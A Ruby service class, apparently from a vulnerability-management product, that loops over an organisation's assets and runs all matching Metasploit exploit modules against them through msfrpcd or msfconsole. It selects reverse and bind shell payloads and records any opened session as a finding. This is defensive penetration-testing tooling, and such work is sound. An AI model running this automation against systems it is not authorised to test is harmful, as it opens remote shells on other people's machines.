require 'json'
require 'socket'
require 'open3'
require 'tempfile'
require 'timeout'
require 'net/smtp'
require 'thread'
require 'msfrpc-client'

class ScanService
  MSF_BASE           = ENV.fetch('MSF_MODULES_PATH',   '/opt/metasploit-framework/embedded/framework/modules/exploits')
  MSF_AUXILIARY_BASE = ENV.fetch('MSF_AUXILIARY_PATH', '/opt/metasploit-framework/embedded/framework/modules/auxiliary')

  def initialize(org_id, filter_params, user_id, scan = nil, asset_ids = [], scan_options = {})
    @org_id        = org_id
    @filter_params = (filter_params || {}).transform_keys(&:to_s)
    @user_id       = user_id
    @scan          = scan
    @asset_ids     = Array(asset_ids).map(&:to_i).select { |id| id > 0 }
    @scan_options  = scan_options || {}
  end

  def perform
    puts "Starting Scan for Org #{@org_id}..."
    targets = get_targets(@org_id)
    results = []
    threads = []
    mutex = Mutex.new

    targets.each do |target|
      target_ip    = target['ip']
      target_ports = target['ports']
      asset_id     = target['asset_id']

      threads << Thread.new do
        begin
          scan_target_id  = create_scan_target(asset_id)
          target_findings = 0
          target_exploits = 0

          if connect_network(target_ip) == 1
            target_os  = target['os']
            modules    = get_modules_for_target(target_os)
            sev_filter = @filter_params['severities']

            target_ports.each do |port|
              modules.each do |mod|
                severity = read_module_rank(mod[:file])
                next if sev_filter.present? && !sev_filter.include?(severity)

                exploit_record = get_or_create_exploit_record(mod[:path], mod[:file])
                exploit_hash = {
                  'id'                => exploit_record.id,
                  'name'              => exploit_record.name,
                  'metasploit_module' => mod[:path],
                  'severity'          => severity,
                  'default_payload'   => exploit_record.default_payload
                }

                start_ms = (Time.now.to_f * 1000).to_i
                result   = attack(exploit_hash, target_ip, port, target['proxy'])
                elapsed  = (Time.now.to_f * 1000).to_i - start_ms

                target_exploits += 1
                exploit_result = result[:success] ? 'success' : 'failed'
                create_scan_exploit(asset_id, exploit_record.id, exploit_result, elapsed)

                if result[:success]
                  target_findings += 1
                  create_finding(asset_id, exploit_record.id, severity, result[:evidence])
                end

                mutex.synchronize do
                  results << {
                    target:          target_ip,
                    port:            port,
                    exploit:         mod[:path],
                    exploit_name:    exploit_record.name,
                    severity:        severity,
                    success:         result[:success],
                    scan_mode:       @scan_options[:safe_mode] ? 'reconnaissance' : 'exploit',
                    timestamp:       Time.now,
                    cve_id:          exploit_record.cve_id,
                    description:     exploit_record.description,
                    disclosure_date: exploit_record.disclosure_date&.to_s,
                    references:      exploit_record.references,
                    evidence:        result[:evidence]
                  }
                end
              end
            end

            disconnect_network()
          else
            puts "Could not connect to target #{target_ip}."
          end

          complete_scan_target(scan_target_id, target_exploits, target_findings)
        rescue => e
          puts "Error scanning target #{target_ip}: #{e.message}"
        end
      end
    end

    threads.each(&:join)

    findings_count = results.count { |r| r[:success] }
    critical = results.count { |r| r[:success] && r[:severity]&.downcase == 'critical' }
    high     = results.count { |r| r[:success] && r[:severity]&.downcase == 'high' }
    medium   = results.count { |r| r[:success] && r[:severity]&.downcase == 'medium' }
    low      = results.count { |r| r[:success] && r[:severity]&.downcase == 'low' }

    @scan&.update!(
      status:                'completed',
      end_time:              Time.current,
      total_exploits_tested: results.size,
      findings_count:        findings_count,
      scanned_assets:        targets.size,
      critical_findings:     critical,
      high_findings:         high,
      medium_findings:       medium,
      low_findings:          low,
      safe_mode:             @scan_options[:safe_mode] || false
    )

    successful_results = @scan_options[:safe_mode] ? results : results.select { |r| r[:success] }
    report_json = result_to_json(successful_results)

    Report.create!(
      organization_id: @org_id,
      user_id:         @user_id,
      generated_by:    @user_id,
      scan_id:         @scan&.id,
      report_name:     "Scan #{Time.current.strftime('%Y-%m-%d %H:%M')}",
      report_type:     @scan_options[:safe_mode] ? 'reconnaissance' : 'vulnerability',
      report_format:   'json',
      report_data:     successful_results,
      generated_at:    Time.current
    )

    log_results_to_file(report_json, @org_id)
    cleanup_old_logs(7)

    user = User.find_by(id: @user_id)
    if user&.email_address
      send_email(user.email_address, "Scan Report for Org #{@org_id}", report_json)
    else
      puts "No email found for user #{@user_id}"
    end

    puts "Scan complete."
  end

  private

  def connect_network(ip)
    puts "Connecting to network at #{ip}..."
    # Actual connectivity is verified by Metasploit via the configured SOCKS5 proxy.
    return 1
  end

  def disconnect_network
    puts "Disconnecting from network..."
    return 1
  end

  def attack(exploit, target_ip, port, proxy = nil)
    effective_port = @scan_options[:port_override].presence || port
    timeout_secs   = (@scan_options[:timeout].presence || 120).to_i
    client         = rpc_client

    unless client
      return attack_subprocess(exploit, target_ip, effective_port, proxy, timeout_secs)
    end

    if @scan_options[:safe_mode]
      rpc_run_auxiliary(client, exploit, target_ip, effective_port, proxy, timeout_secs)
    else
      rpc_run_exploit(client, exploit, target_ip, effective_port, proxy, timeout_secs)
    end
  rescue => e
    puts "Attack error [#{exploit['metasploit_module']}]: #{e.message}"
    { success: false, evidence: nil }
  end

  def rpc_config
    {
      host: ENV.fetch('MSF_RPC_HOST', '127.0.0.1'),
      port: ENV.fetch('MSF_RPC_PORT', '55553').to_i,
      ssl:  ENV.fetch('MSF_RPC_SSL', 'true') =~ /\A(t|y|1)/i ? true : false,
      uri:  '/api/'
    }
  end

  def outbound_ip_for(target_ip)
    UDPSocket.open { |s| s.connect(target_ip, 1); s.addr.last }
  rescue
    ENV.fetch('MSF_LHOST', '127.0.0.1')
  end

  def rpc_client
    return Thread.current[:msf_rpc] if Thread.current[:msf_rpc]
    pass = ENV['MSF_RPC_PASS']
    unless pass
      puts "WARNING: MSF_RPC_PASS not set — falling back to msfconsole subprocess (slow)"
      return nil
    end
    client = Msf::RPC::Client.new(rpc_config)
    client.login(ENV.fetch('MSF_RPC_USER', 'msf'), pass)
    Thread.current[:msf_rpc] = client
  rescue => e
    puts "msfrpcd connection failed: #{e.message} — falling back to msfconsole subprocess (slow)"
    nil
  end

  def select_payload(client, mod_name, use_bind)
    res      = client.call('module.compatible_payloads', mod_name)
    payloads = res['payloads'] || []
    return nil if payloads.empty?

    if use_bind
      prefs  = %w[cmd/unix/bind_netcat cmd/unix/bind_perl cmd/unix/bind_ruby linux/x86/shell_bind_tcp]
      chosen = prefs.find { |p| payloads.include?(p) }
      chosen || payloads.find { |p| p.include?('bind') } || payloads.first
    else
      prefs  = %w[cmd/unix/interact cmd/unix/reverse_netcat cmd/unix/reverse_perl
                  linux/x86/shell_reverse_tcp linux/x86/shell/reverse_tcp]
      chosen = prefs.find { |p| payloads.include?(p) }
      chosen || payloads.find { |p| p.include?('reverse') } || payloads.first
    end
  rescue => e
    puts "compatible_payloads failed for #{mod_name}: #{e.message}"
    nil
  end

  def rpc_run_exploit(client, exploit, target_ip, port, proxy, timeout_secs)
    mod_name = exploit['metasploit_module'].sub(/\Aexploit\//, '')
    use_bind = proxy.present?
    payload  = exploit['default_payload'].presence || select_payload(client, mod_name, use_bind)

    unless payload
      puts "No compatible payload for #{mod_name}, skipping"
      return { success: false, evidence: nil }
    end

    options = {
      'RHOSTS'         => target_ip,
      'PAYLOAD'        => payload,
      'LHOST'          => outbound_ip_for(target_ip),
      'LPORT'          => ENV.fetch('MSF_LPORT', '4444'),
      'ConnectTimeout' => '15',
      'ExitOnSession'  => 'false'
    }
    options['RPORT']   = port.to_s if port
    options['Proxies'] = proxy     if proxy

    puts "RPC exploit: #{target_ip}:#{port} [#{mod_name}] payload=#{payload}#{proxy ? " via #{proxy}" : ""}"

    existing = (client.call('session.list') rescue {}).keys.to_set
    result   = client.call('module.execute', 'exploit', mod_name, options)
    job_id   = result['job_id']&.to_s

    unless job_id
      puts "module.execute returned no job_id for #{mod_name}"
      return { success: false, evidence: nil }
    end

    deadline = Time.now + timeout_secs
    while Time.now < deadline
      sleep 2
      sessions    = client.call('session.list') rescue {}
      new_entries = sessions.reject { |id, _| existing.include?(id) }
      if new_entries.any?
        sid, info = new_entries.first
        evidence  = "Session #{sid}: #{info['tunnel_local']} -> #{info['tunnel_peer']} " \
                    "[#{info['session_type']} via #{mod_name}]"
        puts "[+] #{evidence}"
        return { success: true, evidence: evidence }
      end
      jobs = client.call('job.list') rescue {}
      break unless jobs.key?(job_id)
    end

    { success: false, evidence: nil }
  rescue Msf::RPC::ServerException => e
    puts "RPC ServerException [#{mod_name}]: #{e.message}"
    { success: false, evidence: nil }
  end

  def rpc_run_auxiliary(client, exploit, target_ip, port, proxy, timeout_secs)
    mod_name = exploit['metasploit_module'].sub(/\Aauxiliary\//, '')
    con = client.call('console.create')
    cid = con['id'].to_s
    begin
      cmds = [
        "use auxiliary/#{mod_name}",
        "set RHOSTS #{target_ip}",
        (port ? "set RPORT #{port}" : nil),
        "set ConnectTimeout 15",
        (proxy ? "set Proxies #{proxy}" : nil),
        "run",
        ""
      ].compact.join("\n") + "\n"

      client.call('console.write', cid, cmds)
      deadline = Time.now + timeout_secs
      output = ''
      while Time.now < deadline
        sleep 2
        res     = client.call('console.read', cid) rescue {}
        output += res['data'].to_s
        break unless res['busy']
      end

      success  = output.match?(/\[\+\]/i)
      evidence = output.scan(/\[\+\].+/).map(&:strip).join("\n").first(500)
      puts success ? "[+] #{mod_name} detected something on #{target_ip}" : "[-] #{mod_name} — nothing detected"
      { success: success, evidence: evidence.presence }
    ensure
      client.call('console.destroy', cid) rescue nil
    end
  rescue Msf::RPC::ServerException => e
    puts "RPC ServerException [#{mod_name}]: #{e.message}"
    { success: false, evidence: nil }
  end

  # Fallback used when msfrpcd is unavailable (MSF_RPC_PASS not set or connection refused).
  def attack_subprocess(exploit, target_ip, port, proxy, timeout_secs)
    rc_file  = Tempfile.new(['aegis_', '.rc'])
    log_file = Tempfile.new(['aegis_out_', '.txt'])

    begin
      rc_file.write(build_resource_file(exploit, target_ip, port, proxy))
      rc_file.flush

      puts "Launching msfconsole for #{target_ip}:#{port} [#{exploit['name']}]#{proxy ? " via #{proxy}" : " (direct)"}"
      pid = Process.spawn(
        'msfconsole', '-q', '--no-readline', '-r', rc_file.path,
        [:out, :err] => log_file.path
      )

      begin
        Timeout.timeout(timeout_secs + 10) { Process.wait(pid) }
      rescue Timeout::Error
        Process.kill('TERM', pid) rescue nil
        Process.wait(pid) rescue nil
      end

      output  = File.read(log_file.path)
      success = if @scan_options[:safe_mode]
        output.match?(/\[\+\]/i)
      else
        output.match?(/session \d+ opened|Meterpreter session|Command shell session/i)
      end
      evidence_lines = output.scan(/\[\+\].*|.*session \d+ opened.*/i).join("\n")
      evidence = evidence_lines.length > 500 ? evidence_lines[0, 500] : evidence_lines
      { success: success, evidence: evidence.presence || (success ? 'Session established' : nil) }
    ensure
      rc_file.close!   rescue nil
      log_file.close!  rescue nil
    end
  rescue => e
    puts "Attack failed: #{e.message}"
    { success: false, evidence: nil }
  end

  def build_resource_file(exploit, target_ip, port, proxy)
    @scan_options[:safe_mode] ? build_auxiliary_rc(exploit, target_ip, port, proxy)
                              : build_exploit_rc(exploit, target_ip, port, proxy)
  end

  def build_exploit_rc(exploit, target_ip, port, proxy)
    lhost   = outbound_ip_for(target_ip)
    lport   = ENV.fetch('MSF_LPORT', '4444')
    payload = exploit['default_payload'].presence || default_payload_for(exploit)

    lines = [
      "use #{exploit['metasploit_module']}",
      "set RHOSTS #{target_ip}",
      (port ? "set RPORT #{port}" : nil),
      "set PAYLOAD #{payload}",
      "set LHOST #{lhost}",
      "set LPORT #{lport}",
      "set ExitOnSession false",
      "set ConnectTimeout 15",
      (proxy ? "set Proxies #{proxy}" : nil),
      "run -z",
      "sleep 15",
      "sessions -l",
      "exit -y"
    ].compact
    lines.join("\n") + "\n"
  end

  def build_auxiliary_rc(exploit, target_ip, port, proxy)
    lines = [
      "use #{exploit['metasploit_module']}",
      "set RHOSTS #{target_ip}",
      (port ? "set RPORT #{port}" : nil),
      "set ConnectTimeout 15",
      (proxy ? "set Proxies #{proxy}" : nil),
      "run",
      "exit -y"
    ].compact
    lines.join("\n") + "\n"
  end

  def default_payload_for(exploit)
    mod = exploit['metasploit_module'].to_s
    if    mod.include?('windows') then 'windows/x64/shell/reverse_tcp'
    elsif mod.include?('osx')     then 'osx/x64/shell_reverse_tcp'
    elsif mod.include?('apple')   then 'osx/x64/shell_reverse_tcp'
    else  'linux/x86/shell/reverse_tcp'
    end
  end

  def create_scan_target(asset_id)
    return nil unless @scan&.id && asset_id
    result = ActiveRecord::Base.connection.execute(
      "INSERT INTO vuln_scanner.scan_targets (scan_id, asset_id, target_status, started_at) " \
      "VALUES (#{@scan.id.to_i}, #{asset_id.to_i}, 'scanning', NOW()) " \
      "ON CONFLICT (scan_id, asset_id) DO UPDATE SET target_status = 'scanning', started_at = NOW() " \
      "RETURNING id"
    )
    result.first&.fetch('id', nil)
  rescue => e
    puts "Error creating scan_target: #{e.message}"
    nil
  end

  def complete_scan_target(scan_target_id, exploits_tested, findings_count)
    return unless scan_target_id
    ActiveRecord::Base.connection.execute(
      "UPDATE vuln_scanner.scan_targets " \
      "SET target_status = 'completed', completed_at = NOW(), " \
      "exploits_tested = #{exploits_tested.to_i}, findings_count = #{findings_count.to_i} " \
      "WHERE id = #{scan_target_id.to_i}"
    )
  rescue => e
    puts "Error completing scan_target: #{e.message}"
  end

  def create_scan_exploit(asset_id, exploit_id, result, elapsed_ms)
    return unless @scan&.id && asset_id && exploit_id
    safe_result = %w[success failed].include?(result) ? result : 'failed'
    ActiveRecord::Base.connection.execute(
      "INSERT INTO vuln_scanner.scan_exploits (scan_id, asset_id, exploit_id, result, execution_time_ms, tested_at) " \
      "VALUES (#{@scan.id.to_i}, #{asset_id.to_i}, #{exploit_id.to_i}, '#{safe_result}', #{elapsed_ms.to_i}, NOW())"
    )
  rescue => e
    puts "Error creating scan_exploit: #{e.message}"
  end

  def create_finding(asset_id, exploit_id, severity, evidence)
    return unless @scan&.id && asset_id && exploit_id
    safe_severity = %w[critical high medium low].include?(severity&.downcase) ? severity.downcase : 'medium'
    safe_evidence = ActiveRecord::Base.connection.quote(evidence.to_s)
    ActiveRecord::Base.connection.execute(
      "INSERT INTO vuln_scanner.findings (scan_id, asset_id, exploit_id, severity, status, evidence, discovered_at) " \
      "VALUES (#{@scan.id.to_i}, #{asset_id.to_i}, #{exploit_id.to_i}, '#{safe_severity}', 'open', #{safe_evidence}, NOW())"
    )
  rescue => e
    puts "Error creating finding: #{e.message}"
  end

  def result_to_json(results_raw)
    JSON.generate(results_raw)
  rescue JSON::GeneratorError => e
    puts "JSON Generation Error: #{e.message}"
  end

  def log_results_to_file(results_json, org_id)
    log_dir = Rails.root.join("logs")
    FileUtils.mkdir_p(log_dir)

    filename = "#{log_dir}/scan_results_org_#{org_id}_#{Time.now.strftime('%Y%m%d_%H%M%S')}.json"
    File.write(filename, results_json)
    puts "Results logged to #{filename}"
  rescue => e
    puts "Failed to log results to file: #{e.message}"
  end

  def cleanup_old_logs(days = 7)
    log_dir = Rails.root.join("logs")
    return unless Dir.exist?(log_dir)

    puts "Cleaning up logs older than #{days} days..."
    cutoff_time = Time.now - (days * 24 * 60 * 60)

    Dir.glob("#{log_dir}/*.json").each do |file|
      begin
        if File.mtime(file) < cutoff_time
          File.delete(file)
          puts "Deleted old log: #{file}"
        end
      rescue => e
        puts "Failed to delete #{file}: #{e.message}"
      end
    end
  end

  def get_modules_for_target(target_os)
    allowlist = @filter_params['module_allowlist']

    if @scan_options[:safe_mode]
      base   = MSF_AUXILIARY_BASE
      prefix = 'auxiliary/'
      dirs   = auxiliary_scanner_dirs(target_os)
    else
      base   = MSF_BASE
      prefix = 'exploit/'
      dirs   = platform_dirs(target_os)
    end

    files = dirs.any? ? dirs.flat_map { |d| Dir.glob("#{base}/#{d}/**/*.rb") }
                      : Dir.glob("#{base}/**/*.rb")

    mods = files.uniq.map { |f| { path: prefix + f.sub("#{base}/", '').sub('.rb', ''), file: f } }
    allowlist.present? ? mods.select { |m| allowlist.include?(m[:path]) } : mods
  end

  def platform_dirs(platform)
    case platform&.downcase
    when 'windows' then %w[windows multi]
    when 'linux'   then %w[linux unix multi]
    when 'macos'   then %w[osx apple_ios multi]
    else []
    end
  end

  def auxiliary_scanner_dirs(platform)
    case platform&.downcase
    when 'windows' then %w[scanner/smb scanner/http scanner/ssh scanner/vnc]
    when 'linux'   then %w[scanner/ssh scanner/ftp scanner/http scanner/mysql scanner/postgres]
    when 'macos'   then %w[scanner/ssh scanner/http scanner/vnc]
    else                %w[scanner/ssh scanner/ftp scanner/http]
    end
  end

  def read_module_rank(file_path)
    content = File.read(file_path) rescue ''
    rank    = content.match(/\bRank\s*=\s*(\w+)/i)&.[](1).to_s.downcase
    case rank
    when /excellent|great/ then 'critical'
    when /good/            then 'high'
    when /normal|average/  then 'medium'
    else                        'low'
    end
  end

  def get_or_create_exploit_record(module_path, file_path)
    exploit = Exploit.find_or_initialize_by(exploit_id: module_path)
    if exploit.new_record? || exploit.description.blank?
      meta = parse_module_metadata(file_path)
      exploit.name             = meta[:name].presence ||
                                 module_path.split('/').last.tr('_', ' ').split.map(&:capitalize).join(' ')
      exploit.description      = meta[:description]
      exploit.cve_id           = meta[:cve_id]
      exploit.disclosure_date  = meta[:disclosure_date]
      exploit.references       = meta[:references]
      exploit.authors          = meta[:authors]
      exploit.severity         = read_module_rank(file_path)
      exploit.metasploit_module = module_path
      exploit.save!
    end
    exploit
  rescue ActiveRecord::RecordNotUnique
    Exploit.find_by!(exploit_id: module_path)
  end

  def parse_module_metadata(file_path)
    content = File.read(file_path) rescue ''

    # Real module name
    name = content.match(/'Name'\s*=>\s*['"]([^'"]+)['"]/m)&.[](1)&.strip

    # Description — handles %q{}, %q(), or plain string
    desc = content.match(/'Description'\s*=>\s*%q[{(](.+?)[})]/m)&.[](1)
    desc ||= content.match(/'Description'\s*=>\s*["'](.+?)["']/m)&.[](1)
    desc = desc&.gsub(/\s+/, ' ')&.strip

    # CVE — first match, normalise to CVE-YYYY-NNNN
    raw_cve = content.match(/\[\s*['"]CVE['"]\s*,\s*['"]([^'"]+)['"]\s*\]/)&.[](1)
    cve_id  = raw_cve ? (raw_cve.start_with?('CVE') ? raw_cve : "CVE-#{raw_cve}") : nil

    # All references as [{type, value}] pairs
    refs = content.scan(/\[\s*['"](\w+)['"]\s*,\s*['"]([^'"]+)['"]\s*\]/)
                  .map { |type, val| { 'type' => type, 'value' => val } }

    # Disclosure date
    raw_date       = content.match(/'DisclosureDate'\s*=>\s*['"]([^'"]+)['"]/m)&.[](1)
    disclosure_date = raw_date ? (Date.parse(raw_date) rescue nil) : nil

    # Author(s)
    authors_block = content.match(/'Authors?'\s*=>\s*\[([^\]]+)\]/m)&.[](1)
    authors = authors_block&.scan(/['"]([^'"]+)['"]/)&.flatten&.join(', ')
    authors ||= content.match(/'Authors?'\s*=>\s*['"]([^'"]+)['"]/m)&.[](1)

    { name: name, description: desc, cve_id: cve_id, references: refs,
      disclosure_date: disclosure_date, authors: authors }
  end

  def get_targets(org_id)
    condition = @asset_ids.any? ? "AND id IN (#{@asset_ids.map(&:to_i).join(',')})" : ""
    result = ActiveRecord::Base.connection.select_all(
      "SELECT id, ip_address, scan_config FROM vuln_scanner.assets WHERE organization_id = #{org_id.to_i} AND is_active = true #{condition}"
    )
    targets = []
    result.each do |row|
      config = JSON.parse(row['scan_config'] || '{}') rescue {}
      ports  = parse_ports(config['port'])
      ip     = row['ip_address'].to_s
      proxy = if @scan_options[:use_agent] == false
        nil
      else
        agent = Agent.find_for_target(org_id, ip)
        agent ? "socks5:127.0.0.1:#{agent.tunnel_port}" : nil
      end
      puts proxy ? "Routing #{ip} via agent proxy #{proxy}" : "Scanning #{ip} directly (no agent)"
      targets << { 'ip' => ip, 'asset_id' => row['id'].to_i, 'ports' => ports, 'proxy' => proxy, 'os' => config['os'] }
    end
    targets
  rescue => e
    puts "Error fetching targets: #{e.message}"
    []
  end

  def parse_ports(port_str)
    return [nil] if port_str.blank?  # nil → each module uses its own default RPORT

    str = port_str.to_s.strip

    # Range: "8000-8080" — pick one random port in range
    if str =~ /\A(\d+)-(\d+)\z/
      lo, hi = $1.to_i, $2.to_i
      return [rand(lo..hi)] if lo >= 1 && hi <= 65535 && lo <= hi
    end

    # Comma-separated or single: "22, 80, 443" — return all valid ports
    ports = str.split(',').map { |p| p.strip.to_i }.select { |p| p >= 1 && p <= 65535 }
    ports.any? ? ports : [rand(1..65535)]
  end

  def parse_port(port_str) = parse_ports(port_str).first

  def send_email(to_email, subject, body)
    from_email = ENV.fetch('SMTP_FROM', 'scanner@example.com')
    smtp_host  = ENV.fetch('SMTP_HOST', 'localhost')
    smtp_port  = ENV.fetch('SMTP_PORT', '25').to_i

    msg = <<~END_OF_MESSAGE
      From: #{from_email}
      To: #{to_email}
      Subject: #{subject}
      MIME-Version: 1.0
      Content-Type: text/plain; charset=utf-8

      #{body}
    END_OF_MESSAGE

    begin
      Net::SMTP.start(smtp_host, smtp_port) do |smtp|
        smtp.send_message msg, from_email, to_email
      end
      puts "Email sent to #{to_email}"
    rescue => e
      puts "Failed to send email: #{e.message}"
    end
  end
end
